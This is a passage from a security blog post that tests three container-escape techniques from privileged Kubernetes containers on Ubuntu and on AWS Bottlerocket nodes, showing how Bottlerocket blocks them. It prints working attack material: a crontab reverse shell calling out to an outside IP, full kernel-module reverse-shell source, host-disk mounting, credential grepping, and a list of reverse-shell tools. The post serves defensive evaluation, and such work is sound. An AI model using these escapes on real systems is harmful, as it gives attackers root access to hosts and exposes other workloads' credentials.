dev=\"nvme1n1p1\" ino=17707920 scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:object_r:data_t:s0:c665,c750 tclass=file permissive=0\n</code></pre></p> <p>The <code>payload</code> binary has been labelled with <code>data_t</code>, indicating that it must never be executed. Additionally, the kernel thread attempted execution without proper domain transition, which is disallowed by SELinux policy.</p> <p>Bonus Features!</p> <p>Could we have gotten further if SELinux hadn't blocked the payload execution? Not likely, since Bottlerocket implements layers of protection that make typical reverse shell payloads unusable. For example, take a look at what the default shell on a Bottlerocket node actually links to:</p> <pre><code>bash-5.1# ls -l /bin/sh\nlrwxrwxrwx. 1 root root 5 Sep 12 03:30 /bin/sh -&gt; brush\n</code></pre> <p><code>brush</code> is a nonstandard, restricted command runner, that doesn't implement typical interactive behaviour or shell redirection features. Essentially it's a minimalist interface to the Bottlerocket API client, meaning it doesn't have the bash-like features needed to establish the connection to our waiting listener. In a typical Linux environment, there are usually plenty of alternative ways to establish a reverse-shell - revshells.com lists several, including:</p> <ul> <li><code>nc</code></li> <li><code>busybox</code></li> <li><code>perl</code></li> <li><code>python3</code></li> <li><code>php</code></li> <li><code>ruby</code></li> </ul> <p>Unsurprisingly, none of these are present inside of Bottlerocket. By design, the OS comes with no (usable) shell, package manager or language interpreters - just a minimal container runtime \ud83d\ude80</p>"},{"location":"blog/hands-on-with-aws-bottlerocket/#technique-2-mounting-the-host-filesystem","title":"Technique 2: Mounting the Host Filesystem","text":"<p>Another common technique for escaping from a container is to access the host's filesystem, by simply mounting the relevant block device and make the contents available through the container's filesystem. Again, this escape relies on the fact that privileged mode disables a number of key security controls:</p> <ol> <li>the device cgroup controller's limitations that prevent processes inside the container interacting with host's block devices are lifted</li> <li>the <code>cap_sys_admin</code> capability is enabled, allowing for the running of the <code>mount</code> command</li> </ol> <p>Executing this attack from a container hosted on a Ubuntu-based node is straightforward:</p> <ol> <li> <p>list the available block devices via <code>lsblk</code>: <pre><code>root@app-priv-ubuntu:/# lsblk\nNAME         MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS\nloop0          7:0    0   24M  1 loop\nloop1          7:1    0 49.6M  1 loop\nloop2          7:2    0 68.9M  1 loop\nloop3          7:3    0 59.6M  1 loop\nloop4          7:4    0  4.8M  1 loop\nloop5          7:5    0 11.5M  1 loop\nloop6          7:6    0 15.3M  1 loop\nloop7          7:7    0 44.2M  1 loop\nnvme0n1      259:0    0   20G  0 disk\n|-nvme0n1p1  259:2    0   19G  0 part /etc/resolv.conf\n|                                     /etc/hostname\n|                                     /dev/termination-log\n|                                     /etc/hosts\n|-nvme0n1p15 259:3    0   99M  0 part\n`-nvme0n1p16 259:4    0  923M  0 part\nnvme1n1      259:1    0   20G  0 disk\n</code></pre></p> </li> <li> <p>mount the host's underyling partition, using its retrieved device name: <pre><code>root@app-priv-ubuntu:/# mount /dev/nvme0n1p1 /mnt\n</code></pre></p> </li> <li> <p>access the host's entire filesystem via the <code>/mnt</code> directory: <pre><code>root@app-priv-ubuntu:/# ls -la /mnt\ntotal 104\ndrwxr-xr-x 23 root root  4096 Oct 15 04:29 .\ndrwxr-xr-x  1 root root  4096 Oct 15 04:29 ..\nlrwxrwxrwx  1 root root     7 Apr 22  2024 bin -&gt; usr/bin\ndrwxr-xr-x  2 root root  4096 Feb 26  2024 bin.usr-is-merged\ndrwxr-xr-x  2 root root  4096 Oct  1 12:43 boot\ndrwxr-xr-x  4 root root  4096 Oct  1 12:34 dev\ndrwxr-xr-x 83 root root  4096 Oct 15 04:35 etc\ndrwxr-xr-x  4 root root  4096 Oct 15 04:35 home\ndrwxr-xr-x  3 root root  4096 Oct 15 04:29 host\nlrwxrwxrwx  1 root root     7 Apr 22  2024 lib -&gt; usr/lib\ndrwxr-xr-x  2 root root  4096 Feb 26  2024 lib.usr-is-merged\ndrwx------  2 root root 16384 Oct  1 12:42 lost+found\ndrwxr-xr-x  2 root root  4096 Oct  1 12:34 media\ndrwxr-xr-x  2 root root  4096 Oct  1 12:34 mnt\ndrwxr-xr-x  5 root root  4096 Oct 15 04:29 opt\ndrwxr-xr-x  2 root root  4096 Apr 22  2024 proc\ndrwx------  5 root root  4096 Oct 15 04:29 root\ndrwxr-xr-x  5 root root  4096 Oct  1 12:54 run\nlrwxrwxrwx  1 root root     8 Apr 22  2024 sbin -&gt; usr/sbin\ndrwxr-xr-x  2 root root  4096 Jul 10 14:46 sbin.usr-is-merged\ndrwxr-xr-x 11 root root  4096 Oct  1 12:54 snap\ndrwxr-xr-x  2 root root  4096 Oct  1 12:34 srv\ndrwxr-xr-x  2 root root  4096 Apr 22  2024 sys\ndrwxrwxrwt 10 root root  4096 Oct 15 04:37 tmp\ndrwxr-xr-x 11 root root  4096 Oct  1 12:34 usr\ndrwxr-xr-x 13 root root  4096 Oct 15 04:28 var\n</code></pre></p> </li> </ol> <p>There are many potential pathways forward from this point. If the host was running ssh, an attacker could pivot to that by reading or modifying the <code>/etc/passwd</code> and <code>/etc/shadow</code> files. This would allow them to retrieve encrypted user passwords for offline cracking, change existing passwords and even add completely new users. Another option would be to insert a new ssh key directly into a user's <code>~/.ssh/authorized_keys</code> file, allowing them to login without knowing the user's existing password. If <code>cron</code> happened to be running on the host, a basic reverse shell that calls out every minute could also be added to the <code>/etc/crontab</code> file, like so: <pre><code>echo \"* * * * * root /bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/15.230.15.77/4444 0&gt;&amp;1'\" &gt;&gt; /mnt/etc/crontab\n</code></pre></p> <p>As soon as the <code>cron</code> daemon reloads, a root-level shell will be caught by the waiting listener, providing the attacker with shell access to the node \ud83d\udc80 <pre><code>[ec2-user@ip-10-240-150-240 ~]$ nc -lvnp 4444\nNcat: Version 7.93 ( https://nmap.org/ncat )\nNcat: Listening on :::4444\nNcat: Listening on 0.0.0.0:4444\nNcat: Connection from 10.248.2.145.\nNcat: Connection from 10.248.2.145:42052.\nbash: cannot set terminal process group (13006): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@ip-10-248-2-145:~# whoami\nwhoami\nroot\n</code></pre></p> <p>What happens when we move to a Bottlerocket node? To start with, <code>lsblk</code> shows us a somewhat different looking list of devices available: <pre><code>root@app-priv-bottlerocket:/# lsblk\nNAME         MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS\nnvme0n1      259:0    0    4G  0 disk\n|-nvme0n1p1  259:2    0    4M  0 part\n|-nvme0n1p2  259:3    0    5M  0 part\n|-nvme0n1p3  259:4    0   40M  0 part\n|-nvme0n1p4  259:5    0  920M  0 part\n|-nvme0n1p5  259:6    0   10M  0 part\n|-nvme0n1p6  259:7    0   25M  0 part\n|-nvme0n1p7  259:8    0    5M  0 part\n|-nvme0n1p8  259:9    0   40M  0 part\n|-nvme0n1p9  259:10   0  920M  0 part\n|-nvme0n1p10 259:11   0   10M  0 part\n|-nvme0n1p11 259:12   0   25M  0 part\n|-nvme0n1p12 259:13   0   41M  0 part\n`-nvme0n1p13 259:14   0    1M  0 part\nnvme1n1      259:1    0   20G  0 disk\n`-nvme1n1p1  259:16   0   20G  0 part /etc/resolv.conf\n                                      /etc/hostname\n                                      /dev/termination-log\n                                      /etc/hosts\n</code></pre></p> <p>What's going on here? As mentioned earlier, Bottlerocket implements a dual-partition, immutable root filesystem approach:</p> <ol> <li>a comparatively small read-only root filesystem available at <code>/dev/nvme0n1p1</code></li> <li>a typically larger data partition available at <code>/dev/nvme1n1p1</code>, intended to store persistent data and container state</li> </ol> <p>Attempting to mount the root filesystem is no longer possible: <pre><code>root@app-priv-bottlerocket:/# mount /dev/nvme0n1p1 /mnt\nmount: /mnt: wrong fs type, bad option, bad superblock on /dev/nvme0n1p1, missing codepage or helper program, or other error.\n       dmesg(1) may have more information after failed mount system call.\n</code></pre></p> <p>The <code>dmesg</code> output confirms this is the case: <pre><code>[ 4521.901135] erofs: (device nvme0n1p1): erofs_read_superblock: cannot find valid erofs superblock\n</code></pre></p> <p>Bottlerocket protects this partition using <code>dm-verity</code>, a kernel feature designed to verify the integrity of read-only partitions. In addition to blocking any attempts to modify the filesystem, the way it is mounted to the node also prevents the partition from being re-mounted into the container, even if it happens to be running in privileged mode.</p> <p>This protection doesn't extend to the data partition however, which can still be mounted from the container:</p> <pre><code>root@app-priv-bottlerocket:/# mount /dev/nvme1n1p1 /mnt\n</code></pre> <p>But when we list the contents of the drive, the results aren't quite what might be expected: <pre><code>root@app-priv-bottlerocket:/# ls -la /mnt\ntotal 0\ndrwxr-xr-x. 7 root root 90 Oct 15 04:40 .\ndrwxr-xr-x. 1 root root 28 Oct 15 04:41 ..\ndrwx------. 2 root root  6 Oct 15 04:40 bootstrap-containers\ndrwx------. 4 root root 34 Oct 15 04:40 host-containers\ndrwxr-xr-x. 2 root root  6 Oct 15 04:40 mnt\ndrwxr-xr-x. 4 root root 53 Oct 15 04:40 opt\ndrwxr-xr-x. 7 root root 88 Oct 15 04:40 var\n</code></pre></p> <p>As well as running with dual partitions, Bottlerocket also maintains two separate container runtimes:</p> <ol> <li>the <code>host container</code> runtime, which supports the privileged <code>control</code> and <code>admin</code> containers, intended to manage the host</li> <li>the <code>application container</code> runtime, which supports containers deployed via kubernetes</li> </ol> <p>The data partition exists primarily to support the host container runtime, indicated by the presence of the <code>/host-containers</code> directory. Due to the need for running services such as <code>kubelet</code> and <code>containerd</code>, it also indirectly supports the application container runtime. To be fair, the <code>/var/lib</code> directory could provide sensitive information related to other containers executing alongside our privileged container, which an attacker would no doubt be interested in. For example, assuming an adjacent container was running with a poorly configured credential, provided via a simple environment variable: <pre><code>- name: PASSWORD\n  value: supersecret\n</code></pre></p> <p>That container could have its credential leaked, through various container runtime configuration files found in <code>/var/lib</code>: <pre><code>root@app-priv-bottlerocket:/mnt# grep -ri supersecret ./* 2&gt;/dev/null\n./var/lib/cni/results/cni-loopback-bb027bf6a87deee6b0f1f4a19efc6e84978f9258e08f08d0e50e772e6518d851-lo:{\"kind\":\"cniCacheV1\",\"containerId\":\"bb027bf6a87deee6b0f1f4a19efc6e84978f9258e08f08d0e50e772e6518d851\",\"config\":\"ewoiY25pVmVyc2lvbiI6ICIwLjMuMSIsCiJuYW1lIjogImNuaS1sb29wYmFjayIsCiJwbHVnaW5zIjogW3sKICAidHlwZSI6ICJsb29wYmFjayIKfV0KfQ==\"...\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Pod\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"name\\\":\\\"reg-pod-bottlerocket-host\\\",\\\"namespace\\\":\\\"default\\\"},\\\"spec\\\":{\\\"containers\\\":[{\\\"command\\\":[\\\"tail\\\",\\\"-f\\\",\\\"/dev/null\\\"],\\\"env\\\":[{\\\"name\\\":\\\"PASSWORD\\\",\\\"value\\\":\\\"supersecret\\\"}],\\\"image\\\":\\\"ubuntu:latest\\\",\\\"name\\\":\\\"ubuntu\\\"}],\\\"nodeSelector\\\":{\\\"nodepool\\\":\\\"arm-bottlerocket\\\"}...\n</code></pre></p> <p>In terms of looking for ways to gain shell access to the node however, Bottlerocket's dual-partition approach limits our options:</p> <ul> <li>there is no direct access to sensitive system files like we had on the Ubuntu host (<code>/etc/*</code>, users' <code>~/.ssh/authorized_keys</code> etc)</li> <li>some of these system files do still exist, but accessing them requires first entering the admin container, before using <code>sheltie</code> to transition the working context to the host, which finally provides access to the host's filesystem</li> </ul> <p>Browsing the files that we do have access to, you may feel a shiver of hope when viewing the contents of <code>/host-containers/admin/user-data</code>: <pre><code>root@app-priv-bottlerocket:/# cat /mnt/host-containers/admin/user-data\n{\"ssh\":{\"authorized-keys\":[]}}\n</code></pre></p> <p>Like other EC2s, Bottlerocket supports provisioning user-data for bootstrapping. What makes it different, however, is the way that this user-data is applied. The file in question is actually mounted into the <code>admin</code> container on startup, rather than being applied to the host. At first glance it may appear that our write access to this file could provide a way of adding an ssh key to the admin container, and while the file is actually editable from the privileged container, modifying it has no effect. This is because changing the admin container's behaviour requires execution of the native Bottlerocket API, which remains out of reach without shell access to the host.</p> <p>In summary, Bottlerocket's dual-partition setup prevents us from getting anywhere near the meaningful files of the host's filesystem, and its read-only setup means that even if we could, it wouldn't prove very useful anyway \ud83d\ude80</p>"},{"location":"blog/hands-on-with-aws-bottlerocket/#technique-3-loading-a-custom-kernel-module","title":"Technique 3: Loading a Custom Kernel Module","text":"<p>The final container escape technique evaluated involves the loading of a malicious, custom kernel module, initiated from within the privileged container but ultimately impacting the host. There is a common misconception that traditional container runtimes provide a strong security boundary between containers, when in reality they're all just processes running on the host (projects such as Kata Containers are seeking to address this). The only operating system kernel at work is usually the one belonging to the host, which it shares with the running containers, meaning any code executed inside those containers is actually executed on the host. Again, this kind of attack is only possible due to the container being launched in privilege mode, which provides it with the <code>CAP_SYS_MODULE</code> capability.</p> <p>To execute the attack, a compatible kernel module that contains the payload needs to be prepared for the container. This can be compiled directly in the container if the required tools are available, or it can be prepared elsewhere and copied over. RBT Security have a great blog post oulining the process, including sample source code for the module:</p> <pre><code># Makefile\nobj-m += k8s-lkm-reverse-shell.o\nKDIR := /lib/modules/$(shell uname -r)/build\nPWD  := $(shell pwd)\nall:\n    $(MAKE) -C $(KDIR) M=$(PWD) modules\nclean:\n    $(MAKE) -C $(KDIR) M=$(PWD) clean\n</code></pre> <pre><code>// k8s-lkm-reverse-shell.c\n#include &lt;linux/module.h&gt;\n#include &lt;linux/kernel.h&gt;\n#include &lt;linux/init.h&gt;\n#include &lt;linux/kmod.h&gt;\n#include &lt;linux/workqueue.h&gt;\n#include &lt;linux/slab.h&gt;\n#define REVERSE_SHELL_CMD \\\n    \"bash -i &gt;&amp; /dev/tcp/15.230.15.77/4444 0&gt;&amp;1\"\n/* Will hold our dynamically-allocated command string */\nstatic char *cmd_buf;\n/* argv and envp for call_usermodehelper */\nstatic char *argv_local[4];\nstatic char *envp_local[] = {\n    \"HOME=/\",\n    NULL\n};\n/* Work item to defer our userspace call */\nstatic DECLARE_WORK(cb_work, NULL);\n/* Work handler - runs in process context, outside of module init */\nstatic void cb_work_handler(struct work_struct *work)\n{\n    pr_info(\"cb_work_handler: launching reverse shell\\n\");\n    call_usermodehelper(argv_local[0], argv_local, envp_local, UMH_NO_WAIT);\n}\nstatic int __init connect_back_init(void)\n{\n    /* 1) Allocate &amp; copy the command into kernel memory */\n    cmd_buf = kmalloc(strlen(REVERSE_SHELL_CMD) + 1, GFP_KERNEL);\n    if (!cmd_buf)\n        return -ENOMEM;\n    strcpy(cmd_buf, REVERSE_SHELL_CMD);\n    /* 2) Populate argv */\n    argv_local[0] = \"/bin/bash\";\n    argv_local[1] = \"-c\";\n    argv_local[2] = cmd_buf;\n    argv_local[3] = NULL;\n    /* 3) Initialize and schedule our work item */\n    INIT_WORK(&amp;cb_work, cb_work_handler);\n    schedule_work(&amp;cb_work);\n    pr_info(\"connect_back: module loaded, work scheduled\\n\");\n    return 0;\n}\nstatic void __exit connect_back_exit(void)\n{\n    /* Ensure any pending work has finished */\n    flush_work(&amp;cb_work);\n    /* Free our command buffer */\n    kfree(cmd_buf);\n    pr_info(\"connect_back: module exiting\\n\");\n}\nmodule_init(connect_back_init);\nmodule_exit(connect_back_exit);\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"RBT Security\");\nMODULE_DESCRIPTION(\"Deferred reverse\u2010shell via privileged container escape PoC\");\n</code></pre> <p>Beginning as usual with our Ubuntu-hosted container, we compile the code and run <code>insmod</code> to load it into the kernel: <pre><code>root@app-priv-ubuntu:/lkm# make clean &amp;&amp; make\nroot@app-priv-ubuntu:/lkm# insmod k8s-lkm-reverse-shell.ko\nroot@app-priv-ubuntu:/lkm#\n</code></pre></p> <p>The module loads cleanly thanks to the <code>CAP_SYS_MODULE</code> capability, and the netcat listener on our waiting EC2 receives a callback \ud83d\udc80 <pre><code>sh-5.2$ nc -lvnp 4444\nNcat: Version 7.93 ( https://nmap.org/ncat )\nNcat: Listening on :::4444\nNcat: Listening on 0.0.0.0:4444\nNcat: Connection from 51.26.193.49.\nNcat: Connection from 51.26.193.49:25716.\nbash: cannot set terminal process group (-1): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@ip-10-248-4-218:/# whoami\nwhoami\nroot\n</code></pre></p> <p>With very little effort, we now have root-level access to the container's host. Trying to load the <code>k8s-lkm-reverse-shell.ko</code> in a container running on our Bottlerocket node, however, results in yet another brick wall: <pre><code>root@app-priv-bottlerocket:/lkm# insmod k8s-lkm-reverse-shell.ko\ninsmod: ERROR: could not insert module k8s-lkm-reverse-shell.ko: Operation not permitted\n</code></pre></p> <p>The culprit this time is Bottlerocket's kernel integrity mode, which prevents the loading of unsigned kernel modules and only permits those included in the Bottlerocket image. Interestingly, this feature was apparently disabled by default in earlier Bottlerocket variants, but is now generally enabled by default, blocking yet another avenue of attack \ud83d\ude80</p>"},{"location":"blog/hands-on-with-aws-bottlerocket/#conclusion","title":"Conclusion","text":"<p>As pointed out at the beginning of this article, none of these container escape techniques are new, nor do they rely on any kind of CVE or exploit. All three are only possible when containers are deployed using a feature that countless resources point out should not be used - yet it still is. While Bottlerocket can block the types of attack demonstrated, that shouldn't be interpreted as an endorsement to use it in the hope of running privileged containers 'safely'. The use of privileged containers should be avoided at all costs.</p> <p>What it does show is that Bottlerocket has been designed with a defence-in-depth strategy, for which the developers should be commended. It both enhances security and at the same time minimises the attack surface. As a container host it provides a foundational pillar for building secure environments, that ideally implement both solid technical controls, and enforce sensible policies that govern how workloads can be deployed.</p>"}]}